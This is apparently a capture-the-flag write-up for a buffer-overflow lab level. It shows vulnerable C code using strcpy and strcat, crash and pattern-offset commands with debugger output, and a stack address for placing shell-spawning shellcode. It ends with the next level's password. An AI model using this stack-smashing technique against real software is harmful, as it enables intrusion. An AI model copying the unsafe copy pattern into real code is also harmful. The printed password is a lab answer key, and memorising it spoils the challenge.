# Performing BufferOverflow to find flag
## My Approach:

### Code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char* concat(char *buf, char *s1, char *s2)
{
        // Copy s1 to buf
        strcpy(buf, s1);
        // Append s2 to s1 into buf
        strcat(buf, s2);
        return buf;
}

int main(int argc, char **argv)
{
        char buf[256];
        char buf1[128];
        char buf2[128];

        if (argc != 3)
                return 0;

        // Copy argv[1] to buf1 and argv[2] to buf2
        strncpy(buf1, argv[1], sizeof(buf1));
        strncpy(buf2, argv[2], sizeof(buf2));

        concat(buf, buf2, buf1);
        printf("String result: %s\n", buf);
        return 0;
}
```
As we can see from the code, the unsafe function strcpy is being used to copy user input to a buffer. The code snippet takes two input arguments from the user and copies them into a larger buffer.
It then prints this buffer. While copying it copies the second argument before the first one.
I first tried to crash the program.
```
level3@lxc-pwn-x86:/levels$ ./level3 $(python -c 'print "A"*125') $(python -c 'print "B"*128')
String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
After multiple trials, I found that the program crashes when the first buffer is filled with 125 A's and the second buffer is filled with 128 B's.
Using this information I wanted to find the offset of an address.
For this, I used the website https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to help generate a pattern and give me an offset value. 
```
String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0AeAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae

Program received signal SIGSEGV, Segmentation fault.
0x41356141 in ?? ()
```
We need to put the address 0x41356141 in the website to get the offset. We get the offset of 15.

Now we need to start to put our payload to spawn a shell. For this, we first need to find an address. In our case, the address is 0xffffdae0 (can be found using print &buf). 
We place the payload in the second buffer. 

![l3](https://user-images.githubusercontent.com/19536413/149811011-534a00b8-f553-4a09-8315-4dd07e264300.png)

We have found the password for the next level. 
## Password is: VHDY2pdYVyXi08kupbos
